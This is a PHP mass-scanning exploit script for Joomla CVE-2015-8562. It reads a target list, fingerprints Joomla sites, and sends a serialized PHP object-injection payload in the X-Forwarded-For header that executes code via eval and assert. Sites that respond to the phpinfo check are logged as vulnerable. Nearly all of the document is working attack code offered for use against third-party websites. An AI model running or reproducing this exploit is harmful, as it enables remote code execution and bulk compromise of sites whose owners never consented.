<?php
error_reporting(0);

$list = "$argv[1]";
$exploit = ' }__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:119:"eval(chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111).chr(40).chr(41).chr(59));JFactory::getConfig();exit";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}����';
$User_Agent = 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.43 Safari/537.31';

function banner()
{
	echo "\t================================================================\n";
	echo "\t                Scanner Bug Joomla CVE-2015-8562                \n";
	echo "\t                       Coded By Team NUCT                       \n";
	echo "\t                      Author : The Jackerz                      \n";
	echo "\t                 Visit : http://0day.nuct.or.id                 \n";
	echo "\t================================================================\n";
}

function how_to()
{
	echo "How to use : php ".$_SERVER["PHP_SELF"]." list_target_joomla\n";
	echo "Example    : php ".$_SERVER["PHP_SELF"]." list.txt\n";
}

function export_ke_file($site)
{
	$buka = fopen("joomla_vuln.txt", a);
	fwrite($buka,"http://".$site."\n");
	fclose($buka);
}

function end_checking()
{
	echo " |\n[*] End Checking\n";
}

if (!$argv[1])
{
	how_to();
	exit;
}

$buka = fopen("$list","r");
$size = filesize("$list");
if (empty($size))
{
	how_to();
	exit;
}
$read = fread($buka,$size);
$sites = explode("\n", $read);
banner();
foreach($sites as $site)
{
	if ($site == "http://"+$site)
	{
		$site = preg_replace("'http://'", '', $site);
	}

	echo "\n[+] Site : http://".$site;
	echo "\n";
	echo "[*] Checking CMS\n";

	$ch = 
	curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://$site/language/en-GB/en-GB.xml");
	curl_setopt($ch, CURLOPT_USERAGENT, $User_Agent);
	curl_setopt($ch, CURLOPT_TIMEOUT, 10);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$version_mentah = curl_exec($ch);
	$check_joomla = curl_getinfo($ch);
	curl_close($ch);

	if($check_joomla['http_code'] != "200")
	{
		echo " |\n |=>[-] Not Joomla\n";
		end_checking();
	}
	else
	{
		echo " |\n |=>[+] Joomla\n";
		echo " |\n[*] Checking Bug CVE-2015-8562\n";

		//ambil cookies di path url yang sama
		$ch = 
		curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://$site/");
		curl_setopt($ch, CURLOPT_TIMEOUT, 10);
		curl_setopt($ch, CURLOPT_USERAGENT, $User_Agent);
		curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie_joomla.txt");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_exec($ch);
		curl_close($ch);

		//Perulangan check vulnerable di path url yang sama
		for ($i=0;$i<2;$i++)
		{
			$ch = 
			curl_init();
			curl_setopt($ch, CURLOPT_URL, "http://$site/");
			curl_setopt($ch, CURLOPT_TIMEOUT, 15);
			curl_setopt($ch, CURLOPT_USERAGENT, $User_Agent);
			curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie_joomla.txt");
			curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-FORWARDED-FOR: $exploit"));
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			$cek_vuln = curl_exec($ch);
			curl_close($ch);
		}

		$version_mentah1 = explode('<version>',$version_mentah);
		$version = explode('</version>',$version_mentah1[1]);

		if (strpos($cek_vuln, "license@php") !== false)
		{
			echo " |\n |=> Status         : Vulnerable\n";
			echo " |=> Joomla Version : $version[0]\n";
			export_ke_file($site);
		}
		else
		{
			echo " |\n |=>[-] Not Vulnerable\n";
		}
		end_checking();
	}
}
$jumlah_vuln = count(file("joomla_vuln.txt"));
$jumlah_list = count(file("$list"));
echo "[*] Site Vulnerable : ".$jumlah_vuln."\n";
echo "[*] List Site       : ".$jumlah_list."\n";

?>
